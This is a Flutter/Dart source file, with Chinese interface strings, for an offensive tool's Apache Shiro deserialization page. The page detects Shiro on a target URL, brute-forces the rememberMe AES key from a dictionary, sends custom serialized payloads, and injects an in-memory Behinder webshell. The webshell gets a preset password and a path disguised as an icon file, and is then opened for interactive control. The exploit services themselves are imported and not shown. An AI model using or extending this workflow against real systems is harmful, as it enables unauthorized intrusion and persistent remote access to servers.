import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart' show Clipboard, ClipboardData;

import '../../database/database_helper.dart';
import '../../exp/shiro/shiro_crypto.dart';
import '../../exp/shiro/shiro_exp_service.dart';
import '../../exp/shiro/shiro_mem_shell_service.dart';
import '../../exp/shiro/shiro_payload_repo.dart';
import '../../models/project.dart';
import '../../models/webshell.dart';
import '../../pages/webshell_interactive_page.dart';
import '../../theme/app_theme.dart';

class ShiroExpPage extends StatelessWidget {
  const ShiroExpPage({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.bgDark,
      appBar: AppBar(
        backgroundColor: AppColors.bgElevated,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back),
          onPressed: () => Navigator.of(context).pop(),
        ),
        title: Row(
          children: [
            const Icon(Icons.cookie, color: AppColors.primary),
            const SizedBox(width: 8),
            Text(
              'Apache Shiro 反序列化利用',
              style: AppTextStyles.heading(size: 14, color: AppColors.primary),
            ),
          ],
        ),
      ),
      body: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
              decoration: BoxDecoration(
                color: AppColors.bgCard,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: AppColors.border),
                boxShadow: [
                  BoxShadow(
                    color: AppColors.primary.withValues(alpha: 0.06),
                    blurRadius: 12,
                    offset: const Offset(0, 2),
                  ),
                ],
              ),
              child: Row(
                children: [
                  Container(
                    width: 44,
                    height: 44,
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                        colors: [
                          AppColors.primary.withValues(alpha: 0.2),
                          AppColors.primary.withValues(alpha: 0.08),
                        ],
                      ),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(
                        color: AppColors.primary.withValues(alpha: 0.4),
                        width: 1,
                      ),
                    ),
                    child: const Icon(Icons.security, color: AppColors.primary, size: 22),
                  ),
                  const SizedBox(width: 16),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'rememberMe Key 爆破与利用',
                          style: AppTextStyles.heading(
                            size: 14,
                            color: AppColors.textPrimary,
                          ),
                        ),
                        const SizedBox(height: 4),
                        Text(
                          '支持 AES-CBC / AES-GCM，字典爆破 Key 后加载自定义 Payload',
                          style: AppTextStyles.caption(
                            size: 12,
                            color: AppColors.textSecondary,
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 16),
            const Expanded(child: _ShiroExpCard()),
          ],
        ),
      ),
    );
  }
}

class _ShiroExpCard extends StatefulWidget {
  const _ShiroExpCard();

  @override
  State<_ShiroExpCard> createState() => _ShiroExpCardState();
}

class _ShiroExpCardState extends State<_ShiroExpCard> {
  final _urlController = TextEditingController();
  final _cookieNameController = TextEditingController();
  final _timeoutController = TextEditingController();
  final _keyController = TextEditingController();
  final _payloadB64Controller = TextEditingController();
  final _logScrollController = ScrollController();

  // 内存马注入相关
  MemShellType _memShellType = MemShellType.filter;
  final _memShellPasswordController = TextEditingController(text: 'mAtrix_911');
  final _memShellPathController = TextEditingController(text: '/favicondemo.ico');
  final _memShellService = const ShiroMemShellService();

  String _method = 'GET';

  String? get _currentKey => _keyController.text.trim().isNotEmpty ? _keyController.text.trim() : null;

  @override
  void dispose() {
    _urlController.dispose();
    _cookieNameController.dispose();
    _timeoutController.dispose();
    _keyController.dispose();
    _payloadB64Controller.dispose();
    _logScrollController.dispose();
    _memShellPasswordController.dispose();
    _memShellPathController.dispose();
    super.dispose();
  }

  ShiroEncryptionMode _encryptionMode = ShiroEncryptionMode.cbc;
  String _log = '';
  bool _running = false;
  bool _verboseMode = false;
  final _payloadRepo = const ShiroPayloadRepo();

  void _appendLog(String line) {
    setState(() {
      final existing = _log.isEmpty ? <String>[] : _log.split('\n');
      existing.add(line);
      const maxLines = 500;
      final trimmed = existing.length > maxLines ? existing.sublist(existing.length - maxLines) : existing;
      _log = trimmed.join('\n');
    });
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_logScrollController.hasClients) {
        _logScrollController.animateTo(
          _logScrollController.position.maxScrollExtent,
          duration: const Duration(milliseconds: 100),
          curve: Curves.easeOut,
        );
      }
    });
  }

  Future<void> _handleCheckShiro() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    setState(() => _running = true);
    _appendLog('[*] 检测 Shiro: $url');
    try {
      final timeout = int.tryParse(_timeoutController.text.trim()) ?? 10;
      final svc = ShiroExpService(
        url: url,
        method: _method,
        cookieName: _cookieNameController.text.trim().isNotEmpty ? _cookieNameController.text.trim() : 'rememberMe',
        timeout: Duration(seconds: timeout),
      );
      final ok = await svc.checkIsShiro();
      _appendLog(ok ? '[+] 发现 Shiro 框架' : '[-] 未检测到 Shiro');
    } catch (e) {
      _appendLog('[!] 检测异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleBruteforce() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    const payloadFile = 'shiro_payload_principal.b64';
    setState(() => _running = true);
    _appendLog('[*] 从 data/$payloadFile 加载序列化 payload（为空则使用默认 principal）...');
    try {
      final payload = await _payloadRepo.loadPayload(payloadFile);
      if (payload.isEmpty) {
        _appendLog('[-] 未能读取 payload 文件或内容为空');
        return;
      }
      final keys = await _payloadRepo.loadKeys();
      if (keys.isEmpty) {
        _appendLog('[-] data/shiro_keys.txt 为空或未找到');
        return;
      }
      final timeout = int.tryParse(_timeoutController.text.trim()) ?? 10;
      final svc = ShiroExpService(
        url: url,
        method: _method,
        cookieName: _cookieNameController.text.trim().isNotEmpty ? _cookieNameController.text.trim() : 'rememberMe',
        timeout: Duration(seconds: timeout),
      );
      _appendLog('[*] 开始爆破 key，候选数：${keys.length}');
      final found = await svc.bruteForceKey(
        candidateKeysBase64: keys,
        serializedPayload: payload,
        mode: _encryptionMode,
        onProgress: _appendLog,
        verbose: _verboseMode,
      );
      if (found != null) {
        setState(() {
          _keyController.text = found;
        });
        _appendLog('[+] 爆破成功，已选中当前 Key：$found');
      } else {
        _appendLog('[!] 未找到可用 key');
      }
    } catch (e) {
      _appendLog('[!] 爆破异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleVerifyKey() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    final key = _currentKey;
    if (key == null) {
      _appendLog('[!] 请先爆破出 Key 或输入 Key');
      return;
    }
    setState(() => _running = true);
    _appendLog('[*] 验证 Key: $key');
    try {
      const payloadFile = 'shiro_payload_principal.b64';
      final payload = await _payloadRepo.loadPayload(payloadFile);
      if (payload.isEmpty) {
        _appendLog('[-] 未能加载 principal payload');
        return;
      }
      final timeout = int.tryParse(_timeoutController.text.trim()) ?? 10;
      final svc = ShiroExpService(
        url: url,
        method: _method,
        cookieName: _cookieNameController.text.trim().isNotEmpty ? _cookieNameController.text.trim() : 'rememberMe',
        timeout: Duration(seconds: timeout),
      );
      final ok = await svc.verifyKey(
        keyBase64: key,
        serializedPayload: payload,
        mode: _encryptionMode,
        onProgress: _appendLog,
      );
      _appendLog(ok ? '[+] Key 验证通过' : '[-] Key 验证失败');
    } catch (e) {
      _appendLog('[!] 验证异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleSendPayload() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    final key = _currentKey;
    if (key == null) {
      _appendLog('[!] 请先爆破出 Key 或输入 Key');
      return;
    }

    setState(() => _running = true);

    try {
      final timeout = int.tryParse(_timeoutController.text.trim()) ?? 10;
      final svc = ShiroExpService(
        url: url,
        method: _method,
        cookieName: _cookieNameController.text.trim().isNotEmpty ? _cookieNameController.text.trim() : 'rememberMe',
        timeout: Duration(seconds: timeout),
      );

      var b64 = _payloadB64Controller.text.trim().replaceAll(RegExp(r'\s+'), '');
      if (b64.isEmpty) {
        _appendLog('[!] 请输入 Payload Base64');
        return;
      }
      if (b64.contains('%')) {
        b64 = Uri.decodeComponent(b64);
      }

      List<int> payload;
      try {
        payload = base64.decode(b64);
      } catch (e) {
        _appendLog('[!] Base64 解码失败: $e');
        return;
      }

      _appendLog('[*] 发送自定义 Payload，使用 Key：$key');
      final result = await svc.sendExploitOnce(
        keyBase64: key,
        serializedPayload: payload,
        mode: _encryptionMode,
        onProgress: _appendLog,
      );
      final res = result.response;
      final code = res.statusCode;
      _appendLog('[+] 发送完成，HTTP: $code');
      if (res.body.trim().isNotEmpty) {
        final snippet = res.body.length > 500 ? '${res.body.substring(0, 500)}...' : res.body;
        _appendLog('[i] 响应体: $snippet');
      }
    } catch (e) {
      _appendLog('[!] 利用异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleInjectMemShell() async {
    final url = _urlController.text.trim();
    final key = _currentKey;
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    if (key == null) {
      _appendLog('[!] 请先填入或爆破出 Key');
      return;
    }

    final password = _memShellPasswordController.text.trim();
    final path = _memShellPathController.text.trim();
    if (password.isEmpty) {
      _appendLog('[!] 请输入冰蝎密码');
      return;
    }
    if (path.isEmpty || !path.startsWith('/')) {
      _appendLog('[!] 路径须以 / 开头，例如 /shell.ico');
      return;
    }

    setState(() => _running = true);
    _appendLog('[*] 开始注入内存马 (${_memShellType.displayName})');
    _appendLog('[*] 密码: $password  路径: $path');

    try {
      final shellBytes = await _memShellService.buildShellClass(
        type: _memShellType,
        password: password,
        path: path,
      );
      _appendLog('[*] Shell 类修补完成（${shellBytes.length} bytes）');

      await _memShellService.inject(
        targetUrl: url,
        keyBase64: key,
        shellClassBytes: shellBytes,
        shellPath: path,
        shellPassword: password,
        mode: _encryptionMode,
        cookieName: _cookieNameController.text.trim().isNotEmpty ? _cookieNameController.text.trim() : 'rememberMe',
        timeout: Duration(seconds: int.tryParse(_timeoutController.text.trim()) ?? 15),
        onProgress: _appendLog,
      );

      final base = Uri.parse(url);
      final baseUrl = base.replace(path: path, query: null).toString();
      final behinderPass = password;
      _appendLog('[i] 注入完成，内存 WebShell: $baseUrl  密码: $behinderPass');
      if (mounted) {
        Webshell ws = Webshell(
          id: 0,
          projectId: 0,
          name: 'Shiro 内存马',
          url: baseUrl,
          password: behinderPass,
          type: 'jsp',
          method: 'POST',
          status: 1,
          connectorType: 'jsp_behinder',
          createdAt: DateTime.now(),
          updatedAt: DateTime.now(),
        );
        try {
          final db = DatabaseHelper();
          final projects = await db.getAllProjects();
          if (!mounted) return;
          Project? project;
          if (projects.isNotEmpty) {
            project = await showDialog<Project>(
              context: context,
              builder: (ctx) => AlertDialog(
                backgroundColor: AppColors.bgCard,
                title: Text('选择项目', style: AppTextStyles.heading(color: AppColors.primary)),
                content: SizedBox(
                  width: 360,
                  child: ListView.builder(
                    shrinkWrap: true,
                    itemCount: projects.length,
                    itemBuilder: (ctx, i) {
                      final p = projects[i];
                      return ListTile(
                        leading: const Icon(Icons.folder_outlined, color: AppColors.primary, size: 20),
                        title: Text(p.name, style: AppTextStyles.body(size: 13, color: AppColors.textPrimary)),
                        subtitle: Text(p.domain, style: AppTextStyles.caption(size: 11, color: AppColors.textMuted)),
                        onTap: () => Navigator.pop(ctx, p),
                      );
                    },
                  ),
                ),
                actions: [
                  TextButton(
                    onPressed: () => Navigator.pop(ctx),
                    child: Text('取消', style: AppTextStyles.body(color: AppColors.textSecondary)),
                  ),
                ],
              ),
            );
          }
          if (project != null) {
            ws = await db.createWebshell(
              project.id,
              name: 'Shiro 内存马',
              url: baseUrl,
              password: behinderPass,
              method: 'POST',
              type: 'jsp',
              connectorType: 'jsp_behinder',
            );
          }
        } catch (_) {}
        if (!mounted) return;
        Navigator.of(context).push(
          MaterialPageRoute(
            builder: (_) => WebshellInteractivePage(webshell: ws),
          ),
        );
      }
    } catch (e) {
      _appendLog('[!] 注入异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: AppColors.border),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: AppColors.primary.withValues(alpha: 0.12),
                  borderRadius: BorderRadius.circular(6),
                ),
                child: const Icon(Icons.cookie, color: AppColors.primary, size: 18),
              ),
              const SizedBox(width: 10),
              Text(
                'Shiro 反序列化',
                style: AppTextStyles.heading(
                  size: 14,
                  color: AppColors.textPrimary,
                ),
              ),
              const SizedBox(width: 12),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                decoration: BoxDecoration(
                  color: AppColors.cyan.withValues(alpha: 0.2),
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: AppColors.cyan.withValues(alpha: 0.5)),
                ),
                child: Text(
                  'Cookie: ${_cookieNameController.text.trim().isNotEmpty ? _cookieNameController.text.trim() : 'rememberMe'}',
                  style: AppTextStyles.caption(size: 10, color: AppColors.cyan),
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          Expanded(
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                Flexible(
                  flex: 1,
                  child: ConstrainedBox(
                    constraints: const BoxConstraints(minHeight: 0, minWidth: 0),
                    child: SingleChildScrollView(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          _shiroSectionTitle('目标配置'),
                          TextField(
                            controller: _urlController,
                            style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                            decoration: _shiroInputDecoration('目标 URL', 'http://localhost:8080'),
                          ),
                          const SizedBox(height: 8),
                          Row(
                            children: [
                              Expanded(
                                child: DropdownButtonFormField<String>(
                                  initialValue: _method,
                                  isExpanded: true,
                                  dropdownColor: AppColors.bgElevated,
                                  icon: const Icon(Icons.arrow_drop_down, color: AppColors.textSecondary, size: 22),
                                  style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
                                  items: const [
                                    DropdownMenuItem(value: 'GET', child: Text('GET', overflow: TextOverflow.ellipsis)),
                                    DropdownMenuItem(value: 'POST', child: Text('POST', overflow: TextOverflow.ellipsis)),
                                  ],
                                  onChanged: (v) {
                                    if (v != null) setState(() => _method = v);
                                  },
                                  decoration: _shiroInputDecoration('方法', ''),
                                ),
                              ),
                              const SizedBox(width: 8),
                              Expanded(
                                child: DropdownButtonFormField<ShiroEncryptionMode>(
                                  initialValue: _encryptionMode,
                                  isExpanded: true,
                                  dropdownColor: AppColors.bgElevated,
                                  icon: const Icon(Icons.arrow_drop_down, color: AppColors.textSecondary, size: 22),
                                  style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
                                  items: const [
                                    DropdownMenuItem(value: ShiroEncryptionMode.cbc, child: Text('AES-CBC', overflow: TextOverflow.ellipsis)),
                                    DropdownMenuItem(value: ShiroEncryptionMode.gcm, child: Text('AES-GCM', overflow: TextOverflow.ellipsis)),
                                  ],
                                  onChanged: (v) {
                                    if (v != null) setState(() => _encryptionMode = v);
                                  },
                                  decoration: _shiroInputDecoration('模式', ''),
                                ),
                              ),
                              const SizedBox(width: 8),
                              Expanded(
                                child: TextField(
                                  controller: _timeoutController,
                                  style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                                  decoration: _shiroInputDecoration('超时(s)', '10'),
                                  keyboardType: TextInputType.number,
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(height: 8),
                          Row(
                            children: [
                              Expanded(
                                child: Text(
                                  '模式: 自定义 Payload（仅发送下方 Base64）',
                                  style: AppTextStyles.caption(
                                    size: 11,
                                    color: AppColors.textSecondary,
                                  ),
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(height: 8),
                          TextField(
                            controller: _cookieNameController,
                            onChanged: (_) => setState(() {}),
                            style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                            decoration: _shiroInputDecoration('Cookie 名', 'rememberMe'),
                          ),
                          const SizedBox(height: 8),
                          Row(
                            children: [
                              Checkbox(
                                value: _verboseMode,
                                onChanged: (v) {
                                  if (v != null) setState(() => _verboseMode = v);
                                },
                              ),
                              Text('详细日志', style: AppTextStyles.caption(size: 11)),
                            ],
                          ),
                          const SizedBox(height: 16),
                          _shiroSectionTitle('Key 与 Payload'),
                          TextField(
                            controller: _keyController,
                            onChanged: (_) => setState(() {}),
                            style: AppTextStyles.body(
                              size: 12,
                              color: _currentKey == null ? AppColors.textMuted : AppColors.cyan,
                            ),
                            decoration: _shiroInputDecoration('当前 Key', '爆破后自动填充').copyWith(
                              suffixIcon: _currentKey == null
                                  ? const Icon(Icons.vpn_key_outlined, size: 16, color: AppColors.textSecondary)
                                  : const Icon(Icons.check_circle, size: 16, color: AppColors.cyan),
                            ),
                          ),
                          const SizedBox(height: 8),
                          TextField(
                            controller: _payloadB64Controller,
                            maxLines: 4,
                            style: AppTextStyles.terminal(size: 11, color: AppColors.cyan),
                            decoration: _shiroInputDecoration('Payload Base64', '粘贴 Base64 编码的序列化 Payload'),
                          ),
                          const SizedBox(height: 8),
                          Wrap(
                            spacing: 8,
                            runSpacing: 8,
                            children: [
                              _shiroActionBtn('检测 Shiro', _handleCheckShiro),
                              _shiroActionBtn('爆破 Key', _handleBruteforce),
                              _shiroActionBtn('验证 Key', _handleVerifyKey, enabled: _currentKey != null),
                              _shiroActionBtn('发送 Payload', _handleSendPayload, enabled: _currentKey != null),
                            ],
                          ),
                          const SizedBox(height: 20),
                          _shiroSectionTitle('内存冰蝎马注入'),
                          const SizedBox(height: 4),
                          DropdownButtonFormField<MemShellType>(
                            initialValue: _memShellType,
                            isExpanded: true,
                            dropdownColor: AppColors.bgElevated,
                            icon: const Icon(Icons.arrow_drop_down, color: AppColors.textSecondary, size: 22),
                            style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
                            items: MemShellType.values
                                .map((t) => DropdownMenuItem(
                                      value: t,
                                      child: Text(t.displayName, overflow: TextOverflow.ellipsis),
                                    ))
                                .toList(),
                            onChanged: (v) {
                              if (v != null) setState(() => _memShellType = v);
                            },
                            decoration: _shiroInputDecoration('Shell 类型', ''),
                          ),
                          const SizedBox(height: 8),
                          Row(
                            children: [
                              Expanded(
                                child: TextField(
                                  controller: _memShellPasswordController,
                                  style: AppTextStyles.body(size: 12, color: AppColors.amber),
                                  decoration: _shiroInputDecoration('冰蝎密码（16位HEX）', 'mAtrix_911'),
                                ),
                              ),
                              const SizedBox(width: 8),
                              Expanded(
                                child: TextField(
                                  controller: _memShellPathController,
                                  style: AppTextStyles.body(size: 12, color: AppColors.cyan),
                                  decoration: _shiroInputDecoration('Shell 路径', '/shell.ico'),
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(height: 6),
                          Container(
                            padding: const EdgeInsets.all(8),
                            decoration: BoxDecoration(
                              color: AppColors.primary.withValues(alpha: 0.05),
                              borderRadius: BorderRadius.circular(6),
                              border: Border.all(color: AppColors.primary.withValues(alpha: 0.2)),
                            ),
                            child: Text(
                              '内置 CB1-InjectMemTool 链，无需手动填写 Payload。服务端反序列化后读取 user 参数注入冰蝎内存马。',
                              style: AppTextStyles.caption(size: 10, color: AppColors.textSecondary),
                            ),
                          ),
                          const SizedBox(height: 8),
                          _shiroActionBtn(
                            '注入内存马',
                            _handleInjectMemShell,
                            enabled: _currentKey != null,
                          ),
                        ],
                      ),
                    ),
                  ),
                ),
                const SizedBox(width: 16),
                Flexible(
                  flex: 1,
                  child: ConstrainedBox(
                    constraints: const BoxConstraints(minHeight: 0, minWidth: 0),
                    child: Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: AppColors.bgDark,
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: AppColors.border),
                      ),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.stretch,
                        children: [
                          Row(
                            children: [
                              Container(
                                width: 6,
                                height: 6,
                                margin: const EdgeInsets.only(right: 6),
                                decoration: BoxDecoration(
                                  shape: BoxShape.circle,
                                  color: _running ? AppColors.primary : AppColors.textMuted,
                                ),
                              ),
                              Text(
                                _running ? '运行中' : '空闲',
                                style: AppTextStyles.caption(
                                  size: 11,
                                  color: _running ? AppColors.primary : AppColors.textSecondary,
                                ),
                              ),
                              const Spacer(),
                              TextButton.icon(
                                onPressed: _log.isEmpty
                                    ? null
                                    : () async {
                                        final messenger = ScaffoldMessenger.of(context);
                                        await Clipboard.setData(ClipboardData(text: _log));
                                        if (!mounted) return;
                                        messenger.showSnackBar(
                                          const SnackBar(content: Text('已复制到剪贴板'), duration: Duration(seconds: 1)),
                                        );
                                      },
                                icon: const Icon(Icons.copy, size: 14),
                                label: const Text('复制'),
                                style: TextButton.styleFrom(
                                  foregroundColor: AppColors.textSecondary,
                                  textStyle: const TextStyle(fontSize: 11),
                                ),
                              ),
                              TextButton.icon(
                                onPressed: _log.isEmpty ? null : () => setState(() => _log = ''),
                                icon: const Icon(Icons.clear_all, size: 14),
                                label: const Text('清空'),
                                style: TextButton.styleFrom(
                                  foregroundColor: AppColors.textSecondary,
                                  textStyle: const TextStyle(fontSize: 11),
                                ),
                              ),
                            ],
                          ),
                          const Divider(height: 1, color: AppColors.border),
                          const SizedBox(height: 4),
                          Expanded(
                            child: SingleChildScrollView(
                              controller: _logScrollController,
                              child: SelectableText.rich(
                                _shiroBuildLogRichText(_log),
                                style: AppTextStyles.terminal(size: 12, color: AppColors.textMuted),
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _shiroSectionTitle(String title) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 6),
      child: Row(
        children: [
          Container(
            width: 3,
            height: 14,
            decoration: BoxDecoration(
              color: AppColors.primary.withValues(alpha: 0.6),
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          const SizedBox(width: 8),
          Text(title, style: AppTextStyles.heading(size: 12, color: AppColors.textSecondary)),
        ],
      ),
    );
  }

  InputDecoration _shiroInputDecoration(String label, String hint) {
    return InputDecoration(
      labelText: label,
      hintText: hint,
      hintStyle: AppTextStyles.caption(size: 11, color: AppColors.textMuted),
      floatingLabelBehavior: FloatingLabelBehavior.always,
      isDense: true,
      contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
      border: OutlineInputBorder(borderRadius: BorderRadius.circular(8)),
      enabledBorder: OutlineInputBorder(
        borderRadius: BorderRadius.circular(8),
        borderSide: const BorderSide(color: AppColors.border),
      ),
      focusedBorder: OutlineInputBorder(
        borderRadius: BorderRadius.circular(8),
        borderSide: BorderSide(color: AppColors.primary.withValues(alpha: 0.6)),
      ),
    );
  }

  Widget _shiroActionBtn(String label, VoidCallback onPressed, {bool enabled = true}) {
    return SizedBox(
      height: 32,
      child: ElevatedButton(
        onPressed: (_running || !enabled) ? null : onPressed,
        style: ElevatedButton.styleFrom(
          textStyle: const TextStyle(fontSize: 11),
          padding: const EdgeInsets.symmetric(horizontal: 12),
        ),
        child: Text(label),
      ),
    );
  }

  Color _shiroLogLineColor(String line) {
    if (line.startsWith('[+]')) return AppColors.primary;
    if (line.startsWith('[!]')) return AppColors.red;
    if (line.startsWith('[-]')) return AppColors.textMuted;
    if (line.startsWith('[*]')) return AppColors.cyan;
    return AppColors.textSecondary;
  }

  TextSpan _shiroBuildLogRichText(String log) {
    if (log.isEmpty) {
      return const TextSpan(text: '> 等待操作', style: TextStyle(color: AppColors.textMuted, fontFamily: 'Monaco'));
    }
    final lines = log.split('\n');
    final spans = <TextSpan>[];
    final baseStyle = AppTextStyles.terminal(size: 12, color: AppColors.textSecondary);
    for (var i = 0; i < lines.length; i++) {
      final line = lines[i];
      final color = _shiroLogLineColor(line);
      spans.add(TextSpan(
        text: line + (i < lines.length - 1 ? '\n' : ''),
        style: baseStyle.copyWith(
          color: color,
          fontWeight: line.startsWith('[+]') || line.startsWith('[!]') ? FontWeight.w600 : null,
        ),
      ));
    }
    return TextSpan(children: spans);
  }
}
